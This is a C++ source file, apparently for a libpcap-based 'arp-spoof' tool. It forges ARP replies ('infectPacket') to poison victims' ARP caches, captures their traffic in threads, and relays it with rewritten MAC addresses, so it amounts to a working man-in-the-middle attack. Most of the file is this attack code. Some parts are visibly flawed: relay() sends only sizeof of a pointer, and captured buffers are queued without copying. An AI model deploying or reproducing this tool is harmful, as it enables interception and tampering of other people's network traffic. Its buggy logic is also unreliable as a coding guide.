#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#include <net/if.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <unistd.h>

#include "ethhdr.h"
#include "iphdr.h"

#include "send.h"

#pragma pack(push, 1)
struct EthIpPacket
{
    EthHdr eth_;
    IpHdr ip_;
};
#pragma pack(pop)

void getDeviceAddress(const char *dev, Ip *ip, Mac *mac)
{
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(struct ifreq));
    strcpy(ifr.ifr_name, dev);
    int sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);

    ioctl(sd, SIOCGIFADDR, &ifr);
    struct sockaddr_in *addrin = (struct sockaddr_in *)&ifr.ifr_addr;
    uint32_t addr32 = ntohl(addrin->sin_addr.s_addr);
    *ip = Ip(addr32);

    ioctl(sd, SIOCGIFHWADDR, &ifr);
    uint8_t *attackerMac = (uint8_t *)ifr.ifr_hwaddr.sa_data;
    *mac = Mac(attackerMac);

    close(sd);
}

void usage()
{
    printf("syntax : arp-spoof<interface><sender ip 1><target ip 1>[<sender ip 2><target ip 2>...]");
    printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2");
}

EthArpPacket EthArpPacket::spoofDefaultPacket()
{
    EthArpPacket packet;
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    return packet;
}

EthArpPacket EthArpPacket::broadcastPacket(Mac attackerMac, Ip attackerIp, Ip destIp)
{
    EthArpPacket packet = spoofDefaultPacket();

    packet.eth_.smac_ = attackerMac;
    packet.eth_.dmac_ = Mac::broadcastMac();

    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.sip_ = attackerIp;
    packet.arp_.smac_ = attackerMac;
    packet.arp_.tip_ = destIp;
    packet.arp_.tmac_ = Mac::nullMac();

    return packet;
}

EthArpPacket EthArpPacket::infectPacket(Mac attackerMac, Mac senderMac, Ip senderIp, Ip targetIp)
{
    EthArpPacket packet = spoofDefaultPacket();

    packet.eth_.smac_ = attackerMac;
    packet.eth_.dmac_ = senderMac;

    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.sip_ = targetIp;
    packet.arp_.smac_ = attackerMac;
    packet.arp_.tip_ = senderIp;
    packet.arp_.tmac_ = senderMac;

    return packet;
}

void EthArpPacket::send(pcap_t *handle)
{
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(this), sizeof(EthArpPacket));
    if (res != 0)
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
}

Mac receiveArpReply(pcap_t *handle, Ip ip_from, int *receivedFlag)
{
    while (true)
    {
        struct pcap_pkthdr *header;
        const u_char *packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0)
            continue;

        EthArpPacket *temp = (EthArpPacket *)packet;
        if (ntohs(temp->eth_.type_) != EthHdr::Arp)
            continue;

        if (temp->arp_.sip_.ntoh() == ip_from)
        {
            *receivedFlag = 1;
            return temp->eth_.smac_;
        }
    }
}

#define MAX_REGISTER 10
#include <set>
#include <map>
#include <queue>

// std::set<Ip> listeningIps;
std::map<Ip, std::queue<u_char *>> pipeIp;
std::map<Ip, pthread_cond_t *> condIp;
std::map<Ip, pthread_mutex_t *> mutexIp;

pthread_mutex_t mutex;
pthread_cond_t cond;

u_char *getNextPcap(pcap_t *handle)
{
    while (true)
    {
        struct pcap_pkthdr *header;
        const u_char *packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0)
            continue;
        return const_cast<u_char *>(packet);
    }
}
// pthread lock at pcap_next_ex??

void *producePacket(void *handle) // pcap_t
{
    while (true)
    {
        u_char *packet = getNextPcap((pcap_t *)handle);
        EthHdr *temp = (EthHdr *)packet;
        if (ntohs(temp->type_) == 0x0800)
        {
            pthread_mutex_lock(&mutex);
            EthIpPacket *tempip = (EthIpPacket *)packet;
            pipeIp[tempip->ip_.dip_.ntoh()].push(packet);
            pthread_cond_signal(&cond);
            pthread_mutex_unlock(&mutex);
        }
        else if (ntohs(temp->type_) == 0x0806)
        {
            pthread_mutex_lock(&mutex);
            EthArpPacket *temparp = (EthArpPacket *)packet;
            pipeIp[temparp->arp_.tip_.ntoh()].push(packet);
            pthread_cond_signal(&cond);
            pthread_mutex_unlock(&mutex);
        }
    }
}
// register mutex and cond on queue?

// thread 1 : pthread_mutex_lock(&mutex);
// while (!condition)
//     pthread_cond_wait(&cond, &mutex);
// /* do something that requires holding the mutex and condition is true */
// pthread_mutex_unlock(&mutex);

// thread2 : pthread_mutex_lock(&mutex);
// /* do something that might make condition true */
// pthread_cond_signal(&cond);
// pthread_mutex_unlock(&mutex);

void registerIp(Ip ip, pthread_cond_t *cond, pthread_mutex_t *mutex)
{
    if (pipeIp.find(ip) == pipeIp.end())
    {
        pipeIp[ip] = std::queue<u_char *>();

        // mutex cond
        condIp[ip] = cond;
        mutexIp[ip] = mutex;
    }
}

u_char *consumePacketByDestIp(Ip ip)
{
    pthread_cond_t *cond = condIp[ip];
    pthread_mutex_t *mutex = mutexIp[ip];
    pthread_mutex_lock(mutex);
    if (pipeIp[ip].size() == 0)
    {
        pthread_cond_wait(cond, mutex);
    }
    u_char *v = pipeIp[ip].front();
    pipeIp[ip].pop();
    pthread_mutex_unlock(mutex);
    return v;
}

void relay(pcap_t *handle, EthIpPacket *packet)
{
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(packet), sizeof(packet));
    if (res != 0)
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
}
// pcap_sendpacket may need another mutex
// no need for cond

void spoof(pcap_t *handle, Ip destIp, Mac atkMac, Mac destMac) // pcap_t *handle, Mac atkMac, Ip destIp, Mac destMac
{
    while (true)
    {
        u_char *packet = consumePacketByDestIp(destIp);
        EthIpPacket *payload = (EthIpPacket *)packet;
        payload->eth_.smac_ = atkMac;
        payload->eth_.dmac_ = destMac;
        relay(handle, payload);
        printf("packet from %s to %s len %u", std::string(payload->ip_.sip()).c_str(), std::string(payload->ip_.dip()).c_str(), payload->ip_.len());
    }
}